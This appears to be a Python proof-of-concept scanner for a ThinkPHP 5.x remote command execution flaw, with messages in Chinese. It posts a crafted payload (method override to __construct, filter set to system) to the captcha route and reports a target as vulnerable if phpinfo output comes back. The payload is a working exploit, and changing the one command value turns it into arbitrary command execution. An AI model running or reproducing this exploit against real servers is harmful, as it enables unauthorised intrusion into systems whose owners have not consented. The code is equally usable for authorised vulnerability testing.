import requests


def test(url):
    data = {'_method':'__construct',
            'filter[]':'system',
            'method':'get',
            'server[REQUEST_METHOD]':'phpinfo'}
    temp = requests.session()
    try:
        print("[*] 正在测试 thinkphp 5.x remote command execution 测试命令(phpinfo())")
        exp = temp.post(url+'/index.php?s=captcha',data = data, timeout = 6)
        if "PHP Version" in exp.text:
            print("有漏洞:%s" % url)
        else:
            print("没有漏洞")
    except:
        print("测试失败")